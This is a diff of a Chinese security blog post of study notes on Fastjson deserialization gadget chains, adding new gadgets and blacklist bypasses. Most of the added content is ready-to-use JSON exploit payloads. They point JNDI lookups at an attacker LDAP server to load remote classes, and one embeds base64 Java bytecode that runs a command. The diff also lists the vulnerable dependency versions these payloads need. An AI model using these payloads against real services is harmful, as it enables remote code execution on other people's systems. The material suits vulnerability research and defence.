@@ -18,14 +18,14 @@
   
     <meta name="description" content="若我不普通 变得坚毅无忌 并没秘方这是纯因你 -《每一个明天 (Live In Hong Kong, 2013)》">
 <meta property="og:type" content="article">
-<meta property="og:title" content="fastjson">
+<meta property="og:title" content="fastjson gadgets学习">
 <meta property="og:url" content="http://example.com/2025/05/06/fastjson%E5%AE%A1%E8%AE%A1/index.html">
 <meta property="og:site_name" content="J_0k3r">
 <meta property="og:description" content="若我不普通 变得坚毅无忌 并没秘方这是纯因你 -《每一个明天 (Live In Hong Kong, 2013)》">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/Live%20In%20Hong%20Kong,%202013.jpg">
 <meta property="article:published_time" content="2025-05-06T05:14:52.000Z">
-<meta property="article:modified_time" content="2025-05-14T08:40:51.971Z">
+<meta property="article:modified_time" content="2025-05-15T14:52:22.411Z">
 <meta property="article:author" content="J_0k3r">
 <meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary_large_image">
@@ -35,7 +35,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>fastjson - J_0k3r</title>
+  <title>fastjson gadgets学习 - J_0k3r</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -251,7 +251,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="fastjson"></span>
+            <span id="subtitle" data-typed-text="fastjson gadgets学习"></span>
           
         </div>
 
@@ -290,7 +290,7 @@
         
         
         
-          105 分钟
+          112 分钟
         
       </span>
     
@@ -339,12 +339,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">fastjson</h1>
+            <h1 id="seo-header">fastjson gadgets学习</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年5月14日 下午
+                    本文最后更新于 2025年5月15日 晚上
                   
                 
               </p>
@@ -353,6 +353,13 @@
               <div class="markdown-body">
                 
                 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h2><p>后面的版本修复主要是对前面版本的gadget加黑名单，寻找新gadget主要通过绕过黑名单来进行，一些已破解的黑名单白名单<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<p>高版本的gadget使用条件比较苛刻，需要考量以下条件</p>
+<ol>
+<li>astjson版本</li>
+<li>JDK版本</li>
+<li>中间件版本</li>
+<li>第三方依赖版本</li>
+</ol>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JdbcRowSetImpl</span><br>&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.196.128:1389/5ltgie&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br><br><br><br><span class="hljs-comment">//TemplatesImpl 不出网可用</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br><br> <br><br><span class="hljs-comment">// JndiDataSourceFactory 需要 mybatis依赖</span><br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br><br><br><br><br></code></pre></td></tr></table></figure>
 
 <p>FastJson ≤ 1.2.24</p>
@@ -898,6 +905,35 @@
 <p>gadget</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.caucho.config.types.ResourceRef&quot;</span> -&gt;   发现 `$ref` -&gt; 解析 `$.value` -&gt; 反射调用 ResourceRef.getValue().lookup(getLookupName)<br></code></pre></td></tr></table></figure>
 
+<h2 id="org-apache-cocoon-components-slide-impl-JMSContentInterceptor"><a href="#org-apache-cocoon-components-slide-impl-JMSContentInterceptor" class="headerlink" title="org.apache.cocoon.components.slide.impl.JMSContentInterceptor"></a>org.apache.cocoon.components.slide.impl.JMSContentInterceptor</h2><p>pom</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml">        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>slide<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slide-kernel<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cocoon<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>cocoon-slide<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>//需要javaee环境，非javaee需要引入下面的依赖<br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.jms<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.jms-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.transaction-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span>,<br>    <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>        <span class="hljs-regexp">//</span> <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.util.Hashtable&quot;</span>, <span class="hljs-regexp">//</span>可有可无<br>        <span class="hljs-string">&quot;java.naming.factory.initial&quot;</span>: <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<br>        <span class="hljs-string">&quot;topic-factory&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在<code>D:\maven_repo\cocoon\cocoon-slide\2.1.11\cocoon-slide-2.1.11.jar!\org\apache\cocoon\components\slide\impl\JMSContentInterceptor.class</code></p>
+<p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747234439937-dbdb7017-52e2-40f2-ad5b-1d71230fd3d5.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到触发<code>lookup</code>的是<code>org.apache.cocoon.components.slide.impl.JMSContentInterceptor#setNamespace</code>参数是<code>this.m_topicFactoryName</code>，所以需要传入<code>&quot;namespace&quot;: &quot;&quot;</code>来触发<code>setter</code></p>
+<p>在调用<code>lookup</code>之前，如果想自定义参数（比如要ldap或者rmi）需要先初始化，<code>InitialContext</code>是访问命名服务的入口点，<code>lookup() </code>方法需要知道从哪里查找资源（如 <code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>） </p>
+<p>这里<code>InitialContext()</code>的参数是<code>this.m_jndiProps</code>和<code>lookup</code>的参数<code>m_topicFactoryName</code>都在<code>org.apache.cocoon.components.slide.impl.JMSContentInterceptor#setParameters</code>通过<code>getParameter</code>来获取</p>
+<p>需要传入一个<code>parameters</code>触发<code>setParameters</code>，并且设置<code>&quot;java.naming.factory.initial&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</code>和<code>&quot;topic-factory&quot;: &quot;ldap://192.168.100.128:1389/Exploit&quot;</code></p>
+<p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747235198971-05704c71-45f4-4f0b-9db2-c913ca95f752.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为初始化时同时传入了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">this</span>.m_jndiProps.put(<span class="hljs-string">&quot;java.naming.provider.url&quot;</span>, <span class="hljs-string">&quot;rmi://localhost:1099/&quot;</span>); <span class="hljs-comment">// 默认值或传入值</span><br></code></pre></td></tr></table></figure>
+
+<p>这告诉 JNDI 使用 RMI 注册表作为其初始的命名服务，<code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>是用来与 RMI 注册表交互的工厂，只用于初始化， 以便能够开始 JNDI 操作  </p>
+<p>当<code> lookup()</code> 方法接收到一个以 URL 形式（如 ldap://…, rmi://…, dns://… 等）的字符串参数时，JNDI 的行为会发生变化：</p>
+<ul>
+<li>JNDI 会解析这个 URL，并识别出其协议 (scheme)，在这里是 “ldap”。 </li>
+<li>然后，JNDI 会尝试寻找并加载一个能够处理该特定协议的 URL 上下文工厂 (URL Context Factory)。</li>
+<li>对于 “ldap” 协议，它会寻找 LDAP 服务提供者 (LDAP Service Provider) 中注册的 LDAP URL 上下文工厂。</li>
+<li> 如果找到了合适的 LDAP URL 上下文工厂（Java 运行时通常内置了 LDAP 服务提供者），JNDI 就会使用这个工厂来解析和处理该 LDAP URL。 </li>
+</ul>
+<p>gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JMSContentInterceptor#setNamespace -&gt; JMSContentInterceptor#setParameters -&gt;  -&gt; InitialContext(<span class="hljs-built_in">this</span>.m_jndiProps).lookup(topic-factory)<br></code></pre></td></tr></table></figure>
+
+
+
 <h1 id="FastJson-≤1-2-67-开启AutoType"><a href="#FastJson-≤1-2-67-开启AutoType" class="headerlink" title="FastJson ≤1.2.67 开启AutoType"></a>FastJson ≤1.2.67 开启AutoType</h1><h2 id="CacheJndiTmLookup-要ignite-core、ignite-jta和依赖"><a href="#CacheJndiTmLookup-要ignite-core、ignite-jta和依赖" class="headerlink" title="CacheJndiTmLookup 要ignite-core、ignite-jta和依赖"></a>CacheJndiTmLookup 要ignite-core、ignite-jta和依赖</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//测试&lt;=2.16版本可以利用</span><br>        &lt;dependency&gt;<br>            &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;<br>            &lt;artifactId&gt;ignite-core&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">2.16</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br>        &lt;dependency&gt;<br>            &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;<br>            &lt;artifactId&gt;ignite-jta&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">2.16</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br></code></pre></td></tr></table></figure>
 
 <p>payload</p>
@@ -968,6 +1004,20 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span>,<br>    <span class="hljs-string">&quot;tmJndiName&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;tmFromJndi&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;transactionManager&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.transactionManager&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p><code>D:\maven_repo\org\apache\aries\transaction\org.apache.aries.transaction.jms\2.0.0\org.apache.aries.transaction.jms-2.0.0.jar!\org\apache\aries\transaction\jms\internal\XaPooledConnectionFactory.class</code>其实是上一个<code>RecoverablePooledConnectionFactory</code>的父类</p>
+<h2 id="org-apache-hadoop-shaded-com-zaxxer-hikari-HikariConfig"><a href="#org-apache-hadoop-shaded-com-zaxxer-hikari-HikariConfig" class="headerlink" title="org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig"></a>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt;<br>    &lt;artifactId&gt;hadoop-client-minicluster&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">3.3</span><span class="hljs-number">.0</span>&lt;/version&gt;   <span class="hljs-comment">//小于3.3.0可用</span><br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<br>    <span class="hljs-string">&quot;metricRegistry&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在<code>D:\maven_repo\org\apache\hadoop\hadoop-client-minicluster\3.3.1\hadoop-client-minicluster-3.3.1.jar!\org\apache\hadoop\shaded\com\zaxxer\hikari\HikariConfig.class</code></p>
+<p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747225843217-f4132125-d344-4fb8-a006-85e6476ab506.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">setMetricRegistry`调用了`lookup`参数是`metricRegistry<br></code></pre></td></tr></table></figure>
+
+<p>另一种payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<br>    <span class="hljs-string">&quot;healthCheckRegistry&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747225970492-3ed495ff-2b8b-4f5d-9c8b-055f148730cb.png" srcset="/img/loading.gif" lazyload></p>
+<p>实际上用的是<code>com.zaxxer.hikari.HikariConfig</code>的gadget（在1.2.60加入了黑名单），不过在<code>hadoop-client-minicluster</code>中引入了该依赖，可以绕过黑名单</p>
 
                 
               </div>
@@ -1020,7 +1070,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>fastjson</div>
+      <div>fastjson gadgets学习</div>
       <div>http://example.com/2025/05/06/fastjson审计/</div>
     </div>
     <div class="license-meta">
